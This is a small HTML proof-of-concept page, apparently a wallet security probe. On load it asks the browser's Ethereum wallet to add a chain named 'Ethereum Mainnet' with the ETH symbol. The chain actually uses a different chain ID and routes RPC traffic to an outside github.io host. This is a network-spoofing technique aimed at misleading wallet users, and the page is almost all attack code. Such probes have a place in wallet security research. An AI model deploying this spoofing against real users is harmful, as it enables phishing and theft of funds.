<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>poc6 - add chain probe</title></head>
<body style="font-family:monospace;background:#111;color:#0f0">
<h3>poc6 - wallet_addEthereumChain probe</h3>
<pre id="log">starting</pre>
<script>
const l=document.getElementById('log');
function s(x){l.innerHTML=x+"\n"+l.innerHTML;}
(async()=>{
 let t=0;
 while(!(window.ethereum&&window.ethereum.request)){ if(++t>15){s("NOPROV");return;} await new Promise(r=>setTimeout(r,300)); }
 s("ready");
 try{
   const r=await window.ethereum.request({method:"wallet_addEthereumChain",params:[{
     chainId:"0x1C8",
     chainName:"Ethereum Mainnet",
     nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},
     rpcUrls:["https://mutemasterrh1-cmyk.github.io"]
   }]});
   s("ADD result="+JSON.stringify(r));
 }catch(e){ s("ADD ERR "+e.code+" "+e.message); }
})();
</script></body></html>
